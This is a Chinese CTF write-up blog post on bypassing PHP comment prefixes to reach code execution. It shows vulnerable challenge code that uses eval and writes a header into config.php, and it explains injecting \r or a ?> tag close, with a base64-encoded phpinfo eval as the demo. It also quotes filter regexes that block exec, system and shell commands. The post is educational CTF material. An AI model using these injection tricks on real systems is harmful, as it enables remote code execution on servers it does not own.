        <content type="html"><![CDATA[<h1 id="从国赛衍生出来的一些php绕过注释符trick"><a href="#从国赛衍生出来的一些php绕过注释符trick" class="headerlink" title="从国赛衍生出来的一些php绕过注释符trick"></a>从国赛衍生出来的一些php绕过注释符trick</h1><p>首先是在很早之前我在XYCTF出过的一道题，<code>牢牢记住，逝者为大</code>，题目代码是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><p>上面的代码在限制字数内能执行代码，当时我给出的解是用换行符进行绕过也就是<code>%0a</code></p><p>在比赛比完之后我就想还有没有其他绕过的方式…</p><h2 id="ciscn2024华东南国赛WEB-粗心的程序员"><a href="#ciscn2024华东南国赛WEB-粗心的程序员" class="headerlink" title="ciscn2024华东南国赛WEB-粗心的程序员"></a>ciscn2024华东南国赛WEB-粗心的程序员</h2><p>这题在扫出文件泄露之后，关键的漏洞代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;default_info_auto_recovery.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\?|php|:/i&quot;</span>,<span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;//登陆时间<span class="subst">$time</span>,<span class="subst">$username</span> <span class="subst">$p</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;config.php&quot;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;config.php&quot;</span>).<span class="variable">$str</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们要绕过的地方就在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;//登陆时间<span class="subst">$time</span>,<span class="subst">$username</span> <span class="subst">$p</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们能看到<code>\n</code>被过滤了，那么我们还有什么其他办法能绕呢 </p><h2 id="方法1-r"><a href="#方法1-r" class="headerlink" title="方法1 \r"></a>方法1 \r</h2><p><code>\r</code> (回车) 和 <code>\n</code> (换行) 是在计算机中用于都表示行终止符的控制字符。</p><ol><li><strong><code>\n</code></strong>:<ul><li>在 Linux 以及编程语言中，<code>\n</code> 表示行的结束，在这些系统中，<code>\n</code> 会将光标移动到下一行的开头。</li></ul></li><li><strong><code>\r</code></strong>:<ul><li>在早期的系统和编程语言中，<code>\r</code> 表示将光标移到当前行的开头，而不移动到下一行。</li><li>在 Windows 系统中，行终止符通常由 <code>\r\n</code> 组合表示。<code>\r</code> 使光标回到行首，<code>\n</code> 将光标移动到下一行。</li></ul></li></ol><p>那么假设我们有这么一串字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello \rWorld</span><br></pre></td></tr></table></figure><p>在大多数现代环境中，回显则会是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">World</span><br></pre></td></tr></table></figure><p>因为 \r 将光标移回行首，随后 World 覆盖了 Hello</p><p>我们在python中进行实验发现是符合的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;hello \rworld&quot;</span>) </span><br><span class="line">world</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>而在我们神奇的php中呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello \rworld&quot;</span>;</span><br></pre></td></tr></table></figure><p>则是回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello </span><br><span class="line">world</span><br></pre></td></tr></table></figure><p>那么我们在php中我们便可以用\r代替换行符</p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2 ?&gt;"></a>方法2 ?&gt;</h2><p>某一天我在写wp的时候，准备把wp的代码写上注释再跑一遍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Pz48P3BocCBwaHBpbmZvKCk7Pz4=&quot;</span>));</span><br><span class="line"><span class="comment">//?&gt;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>发现phpinfo();运行了两次，同时在vscode里面，注释后面的代码是高亮状态，在注释后面的字符为什么会被解析执行呢</p><p>简单测试后了解到了</p><p>PHP解析器在处理注释时并没有完全忽略注释内容，而是会在注释内容中寻找特定的字符序列，例如 <code>?&gt;</code>。这是因为PHP解析器在扫描代码时，会优先处理PHP标签的打开和关闭，这些标签的优先级高于注释的处理</p><p>那么我们就可以用这个方法闭合掉前面的注释符然后再开一个新的标签进行执行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php </tag>
            
            <tag> trick </tag>
            
            <tag> eval </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
